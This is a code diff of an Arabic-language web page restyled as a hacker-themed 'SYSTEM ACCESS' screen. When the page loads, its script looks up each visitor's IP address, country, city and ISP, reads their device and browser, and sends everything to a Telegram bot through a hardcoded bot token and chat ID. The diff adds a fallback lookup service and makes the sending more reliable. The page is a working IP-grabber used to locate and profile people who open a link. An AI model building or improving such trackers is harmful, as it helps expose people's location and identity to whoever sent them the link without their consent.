@@ -3,130 +3,298 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>مرحباً بك</title>
+<title>SYSTEM ACCESS</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+
+  html, body {
+    height: 100%;
+    background: #000;
+    overflow-x: hidden;
+  }
+
+  /* خلفية الأرقام الخضراء (Matrix) */
+  #matrix {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    opacity: 0.55;
+  }
+
+  /* طبقة تعتيم فوق الماتريكس */
+  .overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.85) 100%);
+    z-index: 1;
+  }
+
   body {
-    min-height: 100vh;
-    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
     display: flex;
     align-items: center;
     justify-content: center;
     padding: 20px;
-    color: #fff;
+    position: relative;
+    z-index: 2;
+    min-height: 100vh;
   }
+
   .card {
-    background: rgba(255,255,255,0.08);
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 24px;
-    padding: 40px 30px;
-    max-width: 520px;
+    background: rgba(0, 0, 0, 0.85);
+    border: 1px solid #00ff41;
+    border-radius: 8px;
+    padding: 35px 28px;
+    max-width: 540px;
     width: 100%;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+    box-shadow:
+      0 0 20px rgba(0, 255, 65, 0.4),
+      0 0 60px rgba(0, 255, 65, 0.15),
+      inset 0 0 30px rgba(0, 255, 65, 0.05);
     text-align: center;
+    position: relative;
+    z-index: 3;
     animation: fade 0.8s ease;
   }
+
   @keyframes fade {
     from { opacity: 0; transform: translateY(20px); }
     to { opacity: 1; transform: translateY(0); }
   }
+
+  /* زوايا مزخرفة */
+  .card::before,
+  .card::after {
+    content: "";
+    position: absolute;
+    width: 18px; height: 18px;
+    border: 2px solid #00ff41;
+  }
+  .card::before { top: -2px; right: -2px; border-left: none; border-bottom: none; }
+  .card::after  { bottom: -2px; left: -2px; border-right: none; border-top: none; }
+
+  .terminal-line {
+    font-size: 12px;
+    color: #00ff41;
+    text-align: right;
+    opacity: 0.7;
+    margin-bottom: 8px;
+    letter-spacing: 1px;
+  }
+
   .icon {
-    font-size: 60px;
+    font-size: 54px;
     margin-bottom: 15px;
+    filter: drop-shadow(0 0 12px #00ff41);
     animation: pulse 2s infinite;
   }
   @keyframes pulse {
-    0%,100% { transform: scale(1); }
-    50% { transform: scale(1.08); }
+    0%,100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.08); opacity: 0.85; }
   }
+
   h1 {
-    font-size: 26px;
-    margin-bottom: 10px;
-    background: linear-gradient(90deg,#00f2fe,#4facfe);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
+    font-size: 24px;
+    margin-bottom: 8px;
+    color: #ffffff;
+    letter-spacing: 3px;
+    text-shadow: 0 0 10px #00ff41, 0 0 20px rgba(0,255,65,0.5);
+    font-weight: bold;
   }
-  .subtitle { color: #b8b8d1; margin-bottom: 25px; font-size: 15px; }
+
+  .subtitle {
+    color: #00ff41;
+    margin-bottom: 22px;
+    font-size: 13px;
+    letter-spacing: 1px;
+    opacity: 0.9;
+  }
 
   .info-box {
-    background: rgba(0,0,0,0.25);
-    border-radius: 16px;
-    padding: 20px;
-    margin-top: 20px;
+    background: rgba(0, 0, 0, 0.6);
+    border-radius: 6px;
+    padding: 18px;
+    margin-top: 18px;
     text-align: right;
-    border: 1px solid rgba(255,255,255,0.08);
+    border: 1px solid rgba(0, 255, 65, 0.3);
+    box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.05);
   }
+
   .info-row {
     display: flex;
     justify-content: space-between;
-    padding: 10px 0;
-    border-bottom: 1px dashed rgba(255,255,255,0.1);
-    font-size: 14px;
+    align-items: center;
+    padding: 10px 4px;
+    border-bottom: 1px dashed rgba(0, 255, 65, 0.2);
+    font-size: 13px;
+    gap: 10px;
   }
   .info-row:last-child { border-bottom: none; }
-  .label { color: #9d9dc7; }
-  .value { color: #4facfe; font-weight: 600; word-break: break-all; max-width: 60%; text-align: left; }
+
+  .label {
+    color: #ffffff;
+    opacity: 0.75;
+    white-space: nowrap;
+  }
+
+  .value {
+    color: #00ff41;
+    font-weight: bold;
+    word-break: break-all;
+    text-align: left;
+    max-width: 65%;
+    text-shadow: 0 0 6px rgba(0, 255, 65, 0.6);
+  }
 
   .status {
     margin-top: 22px;
-    font-size: 13px;
-    color: #7fffa1;
+    font-size: 12px;
+    color: #00ff41;
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 8px;
+    letter-spacing: 1px;
   }
+
   .dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: #7fffa1;
-    box-shadow: 0 0 10px #7fffa1;
-    animation: blink 1.5s infinite;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: #00ff41;
+    box-shadow: 0 0 10px #00ff41;
+    animation: blink 1.2s infinite;
   }
-  @keyframes blink { 50% { opacity: 0.3; } }
-  .loading { color: #ffb84d; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+
+  .loading { color: #ffcc00 !important; }
+  .loading .dot { background: #ffcc00; box-shadow: 0 0 10px #ffcc00; }
+
+  .error { color: #ff3b3b !important; }
+  .error .dot { background: #ff3b3b; box-shadow: 0 0 10px #ff3b3b; }
+
+  /* مؤشر وامض مثل الترمينال */
+  .caret {
+    display: inline-block;
+    width: 8px;
+    height: 14px;
+    background: #00ff41;
+    margin-right: 4px;
+    animation: caretBlink 1s steps(2) infinite;
+    vertical-align: middle;
+  }
+  @keyframes caretBlink { 50% { opacity: 0; } }
+
+  @media (max-width: 480px) {
+    .card { padding: 25px 18px; }
+    h1 { font-size: 19px; letter-spacing: 2px; }
+    .icon { font-size: 44px; }
+    .value { font-size: 12px; }
+    .label { font-size: 12px; }
+  }
 </style>
 </head>
 <body>
+
+  <!-- خلفية الأرقام الخضراء -->
+  <canvas id="matrix"></canvas>
+  <div class="overlay"></div>
+
   <div class="card">
-    <div class="icon">🌐</div>
-    <h1>أهلاً بك في موقعنا</h1>
-    <p class="subtitle">يتم تحميل بياناتك تلقائياً...</p>
+    <div class="terminal-line">root@system:~$ ./track_user.sh</div>
+    <div class="icon">🖥️</div>
+    <h1>SYSTEM ACCESS</h1>
+    <p class="subtitle"><span class="caret"></span>جارٍ تحليل بيانات الزائر...</p>
 
     <div class="info-box">
       <div class="info-row">
         <span class="label">🌍 الدولة</span>
-        <span class="value" id="country">جاري التحديد...</span>
+        <span class="value" id="country">...</span>
       </div>
       <div class="info-row">
         <span class="label">📍 المدينة</span>
-        <span class="value" id="city">جاري التحديد...</span>
+        <span class="value" id="city">...</span>
+      </div>
+      <div class="info-row">
+        <span class="label">📡 مزود الخدمة</span>
+        <span class="value" id="isp">...</span>
       </div>
       <div class="info-row">
         <span class="label">🖥️ الجهاز</span>
-        <span class="value" id="device">جاري التحديد...</span>
+        <span class="value" id="device">...</span>
       </div>
       <div class="info-row">
         <span class="label">🧭 المتصفح</span>
-        <span class="value" id="browser">جاري التحديد...</span>
+        <span class="value" id="browser">...</span>
       </div>
       <div class="info-row">
         <span class="label">🔢 عنوان IP</span>
-        <span class="value" id="ip">جاري التحديد...</span>
+        <span class="value" id="ip">...</span>
       </div>
     </div>
 
-    <div class="status" id="status">
-      <span class="dot"></span> <span id="statusText">جارٍ الاتصال...</span>
+    <div class="status loading" id="status">
+      <span class="dot"></span>
+      <span id="statusText">جارٍ الاتصال بالسيرفر...</span>
     </div>
   </div>
 
 <script>
-// ====== إعدادات البوت ======
+/* ============================================================
+   إعدادات البوت
+   ============================================================ */
 const BOT_TOKEN = "8680722294:AAHzvJPvElunEjoFpLrmvRZZKyNtcQS57ww";
 const CHAT_ID   = "8296900150";
 
-// ====== دوال مساعدة ======
+/* ============================================================
+   خلفية الماتريكس (أرقام خضراء)
+   ============================================================ */
+(function matrixBackground() {
+  const canvas = document.getElementById("matrix");
+  const ctx = canvas.getContext("2d");
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener("resize", resize);
+
+  const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789";
+  const fontSize = 15;
+  let columns = Math.floor(canvas.width / fontSize);
+  let drops = new Array(columns).fill(1);
+
+  function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#00ff41";
+    ctx.font = fontSize + "px 'Courier New', monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars.charAt(Math.floor(Math.random() * chars.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+
+  setInterval(draw, 55);
+
+  // إعادة حساب الأعمدة عند تغيير حجم الشاشة
+  window.addEventListener("resize", () => {
+    columns = Math.floor(canvas.width / fontSize);
+    drops = new Array(columns).fill(1);
+  });
+})();
+
+/* ============================================================
+   دوال مساعدة
+   ============================================================ */
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "غير معروف";
@@ -149,12 +317,17 @@ function getDeviceInfo() {
 }
 
 function escapeHTML(t) {
-  return String(t).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+  return String(t).replace(/[&<>"']/g, m => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[m]));
 }
 
+/* ============================================================
+   إرسال إلى تلغرام
+   ============================================================ */
 async function sendToTelegram(info) {
   const message =
-`🔔 <b>زائر جديد دخل الموقع</b>
+`🖥️ <b>SYSTEM ACCESS — زائر جديد</b>
 
 🌍 <b>الدولة:</b> ${escapeHTML(info.country)}
 🏙️ <b>المدينة:</b> ${escapeHTML(info.city)}
@@ -171,42 +344,88 @@ async function sendToTelegram(info) {
 <code>${escapeHTML(info.ua)}</code>`;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  // استخدام FormData (الطريقة الصحيحة مع تلغرام)
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("text", message);
+  formData.append("parse_mode", "HTML");
+  formData.append("disable_web_page_preview", "true");
+
   try {
-    await fetch(url, {
+    const res = await fetch(url, {
       method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
-        disable_web_page_preview: true
-      })
+      body: formData
     });
-    return true;
+    const json = await res.json();
+    console.log("Telegram response:", json);
+    return json.ok === true;
   } catch (e) {
-    console.error(e);
+    console.error("Telegram error:", e);
     return false;
   }
 }
 
-async function track() {
-  const statusText = document.getElementById("statusText");
-  const statusEl = document.getElementById("status");
-  statusEl.classList.add("loading");
-
+/* ============================================================
+   جلب معلومات الزائر
+   ============================================================ */
+async function fetchIPInfo() {
+  // المحاولة الأولى: ipwho.is
   try {
-    // جلب معلومات الـ IP
+    const res = await fetch("https://ipwho.is/");
+    const data = await res.json();
+    if (data && data.success) {
+      return {
+        ip: data.ip || "غير معروف",
+        country: `${data.country || "?"} ${data.country_code ? "(" + data.country_code + ")" : ""}`,
+        city: data.city || "غير معروف",
+        isp: (data.connection && data.connection.isp) || data.connection?.org || "غير معروف"
+      };
+    }
+  } catch (e) {
+    console.warn("ipwho.is failed, trying fallback...", e);
+  }
+
+  // المحاولة الثانية: ipapi.co
+  try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
-
-    const dev = getDeviceInfo();
-    const info = {
+    return {
       ip: data.ip || "غير معروف",
-      country: `${data.country_name || "?"} ${data.country_code ? "("+data.country_code+")" : ""}`,
+      country: `${data.country_name || "?"} (${data.country_code || "?"})`,
       city: data.city || "غير معروف",
-      region: data.region || "",
-      isp: data.org || "غير معروف",
+      isp: data.org || "غير معروف"
+    };
+  } catch (e) {
+    console.error("All IP APIs failed", e);
+    return {
+      ip: "غير معروف",
+      country: "غير معروف",
+      city: "غير معروف",
+      isp: "غير معروف"
+    };
+  }
+}
+
+/* ============================================================
+   التشغيل الرئيسي
+   ============================================================ */
+async function track() {
+  const statusEl = document.getElementById("status");
+  const statusText = document.getElementById("statusText");
+
+  statusEl.className = "status loading";
+  statusText.textContent = "جارٍ الاتصال بالسيرفر...";
+
+  try {
+    const ipInfo = await fetchIPInfo();
+    const dev = getDeviceInfo();
+
+    const info = {
+      ip: ipInfo.ip,
+      country: ipInfo.country,
+      city: ipInfo.city,
+      isp: ipInfo.isp,
       os: dev.os,
       browser: dev.browser,
       deviceType: dev.deviceType,
@@ -215,25 +434,30 @@ async function track() {
       time: new Date().toLocaleString("ar-EG")
     };
 
-    // عرض المعلومات للزائر
+    // عرض البيانات على الصفحة
     document.getElementById("ip").textContent = info.ip;
     document.getElementById("country").textContent = info.country;
     document.getElementById("city").textContent = info.city;
-    document.getElementById("device").textContent = `${info.deviceType} - ${info.os}`;
+    document.getElementById("isp").textContent = info.isp;
+    document.getElementById("device").textContent = `${info.deviceType} — ${info.os}`;
     document.getElementById("browser").textContent = info.browser;
 
     // إرسال إلى تلغرام
+    statusText.textContent = "جارٍ الإرسال إلى السيرفر...";
     const ok = await sendToTelegram(info);
 
-    statusEl.classList.remove("loading");
-    statusText.textContent = ok ? "تم التسجيل بنجاح ✓" : "تعذّر الإرسال، جرب لاحقاً";
-    statusEl.style.color = ok ? "#7fffa1" : "#ff7f7f";
+    if (ok) {
+      statusEl.className = "status";
+      statusText.textContent = "تم التسجيل بنجاح ✓";
+    } else {
+      statusEl.className = "status error";
+      statusText.textContent = "تعذّر الإرسال — تأكد أنك ضغطت /start على البوت";
+    }
 
   } catch (e) {
     console.error(e);
+    statusEl.className = "status error";
     statusText.textContent = "فشل تحميل البيانات";
-    statusEl.classList.remove("loading");
-    statusEl.style.color = "#ff7f7f";
   }
 }
 
